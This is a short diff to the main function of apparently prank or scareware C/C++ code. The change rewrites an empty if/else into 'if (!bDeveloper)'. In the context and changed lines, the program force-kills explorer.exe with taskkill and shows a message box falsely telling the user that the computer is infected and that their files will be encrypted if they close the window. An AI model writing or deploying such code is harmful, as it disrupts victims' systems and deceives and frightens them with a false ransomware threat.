@@ -24,10 +24,7 @@ int main()
 	if (!bDeveloper)
 		system("taskkill /IM explorer.exe /F");
 
-	if (bDeveloper)
-	{
-	}
-	else
+	if (!bDeveloper)
 		MessageBoxA(nullptr, "Your Computer is Infected. If you close this window, all your files will be Encrypted. Press OK to enjoy the last 5 minutes of your pc ;)", "skīñś", MB_OK);
 
 	if (bDeveloper)
